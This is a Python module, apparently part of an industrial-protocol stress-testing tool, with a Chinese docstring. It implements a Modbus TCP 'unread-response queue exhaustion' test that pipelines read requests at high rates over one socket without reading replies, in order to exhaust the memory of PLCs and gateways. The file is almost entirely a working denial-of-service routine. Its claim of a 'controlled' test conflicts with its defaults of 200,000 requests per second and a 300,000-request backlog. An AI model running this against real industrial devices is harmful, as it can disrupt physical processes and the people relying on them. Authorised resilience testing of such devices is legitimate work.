"""
測項：Modbus TCP 請求管線化／未讀回應佇列耗盡測試（Pipelining / Unread-Response Exhaustion）
分類：Modbus TCP（資源消耗型，非單純流量型）
說明：正常 Modbus TCP client 會「送一個請求 → 等回應 → 再送下一個」（或至多維持少量
in-flight 請求）。Modbus TCP 協定本身允許透過 Transaction ID 做請求管線化（同一條連線
不等回應就連續送出多個請求），但許多資源受限的 Slave/Gateway 韌體對「同時有多少筆
請求尚未回應」這件事並沒有做好上限管制與逾時回收——每一筆已接收但尚未處理完成的請求
通常要佔用一塊記憶體（暫存解析後的請求內容、要回傳的 Transaction ID 等），如果 client
持續送但完全不讀回應，這塊「待處理佇列」可能無上限增長，直到記憶體不足或連線被迫關閉。

這跟單純的「高頻率讀取洪水」（fc03_high_freq_read.py 等，每次都送一筆等一筆）不同：
本測項刻意製造大量「已送出但客戶端不去讀」的請求，測的是佇列/緩衝區資源上限，而不是
單純的處理吞吐量。

安全設計：
  - 使用唯讀的 FC03（Read Holding Registers）作為管線化請求內容，不寫入任何資料。
  - pipeline_depth 控制「最多允許多少筆未讀回應堆積」的上限，達到上限後會執行一次
    批次讀取清空累積的回應（避免真的耗盡本機/對方到無法回復的地步，仍是「可控」的
    資源壓力測試而非真的把對方打死不管），之後繼續下一輪管線化。
  - 全程使用單一 TCP 連線 + 原生 socket（不透過 pymodbus 的同步 client，因為 pymodbus
    的 client.read_holding_registers() 是同步阻塞、每次呼叫都會等回應，無法做到
    「送很多筆但先不讀」的管線化行為）。
"""
import socket
import struct
import time

from ..common import RateLimiter, clamp_duration

NAME = "Modbus 請求管線化／未讀回應佇列耗盡測試"
CATEGORY = "Modbus TCP"
PROTOCOL = "TCP"
DEFAULT_PORT = 502
TEST_TYPE = "resource"  # 未讀回應佇列塞爆，消耗的是佇列/緩衝資源


def get_param_schema() -> dict:
    return {
        "rate_per_sec": {"type": "int", "default": 200000, "min": 1, "max": 200000, "desc": "每秒送出管線化請求數（送出時不等待回應）"},
        "pipeline_depth": {
            "type": "int", "default": 300000, "min": 1, "max": 500000,
            "desc": "最多堆積多少筆未讀回應才批次清空一次（越大＝對方要承受的未處理佇列越深）",
        },
        "register_addr": {"type": "int", "default": 1, "min": 0, "max": 65535, "desc": "讀取暫存器起始位址"},
        "register_count": {"type": "int", "default": 125, "min": 1, "max": 125, "desc": "單筆請求讀取數量（協定上限 125，越大單筆佔用越多）"},
        "unit_id": {"type": "int", "default": 1, "min": 0, "max": 247, "desc": "Slave ID"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    rate = int(params.get("rate_per_sec", 200))
    depth = int(params.get("pipeline_depth", 300))
    addr = int(params.get("register_addr", 1))
    count = int(params.get("register_count", 125))
    unit = int(params.get("unit_id", 1))

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3.0)
        sock.connect((target, port))
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)  # 刻意用較小的接收緩衝，加快「累積未讀」的效果
    except OSError as e:
        log_fn(f"[!] 無法連線 {target}:{port}：{e}")
        return {"requests_sent": 0, "connected": False, "error": str(e)}

    limiter = RateLimiter(rate)
    sent, drained, errors, drain_rounds = 0, 0, 0, 0
    pending_since_drain = 0
    start = time.time()
    txn = 1

    pdu = struct.pack(">BHH", 0x03, addr, count)  # FC03 固定請求內容，重複送出

    log_fn(f"[+] 開始管線化未讀回應佇列耗盡測試 @ {rate}/s，pipeline_depth={depth}"
           f"（送出後不立即讀取回應，累積到 depth 才批次清空一次）")

    def _drain():
        nonlocal drained, drain_rounds
        drain_rounds += 1
        sock.setblocking(False)
        got = 0
        deadline = time.time() + 2.0
        try:
            while time.time() < deadline:
                try:
                    chunk = sock.recv(65536)
                    if not chunk:
                        break
                    got += 1
                except BlockingIOError:
                    break
                except OSError:
                    break
        finally:
            sock.setblocking(True)
            sock.settimeout(3.0)
        drained += got

    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        mbap = struct.pack(">HHHB", txn, 0x0000, len(pdu) + 1, unit)
        txn = (txn + 1) % 0xFFFF
        try:
            sock.sendall(mbap + pdu)
            sent += 1
            pending_since_drain += 1
        except OSError as e:
            errors += 1
            if errors <= 5:
                log_fn(f"[!] send error: {e}")
            if errors > 20:
                log_fn("[!] 連續發送失敗過多，提前中止")
                break

        if pending_since_drain >= depth:
            _drain()
            pending_since_drain = 0

    _drain()  # 收尾前最後清一次，避免留下太多殘留在 OS socket buffer 裡

    try:
        sock.close()
    except OSError:
        pass

    elapsed = time.time() - start
    log_fn(
        f"[+] 完成，送出 {sent} 筆管線化請求，共批次清空 {drain_rounds} 次（收到 {drained} 個回應區塊），"
        f"錯誤 {errors} 次"
    )
    return {
        "requests_sent": sent, "drain_rounds": drain_rounds, "responses_drained": drained,
        "errors": errors, "elapsed_sec": round(elapsed, 1),
    }
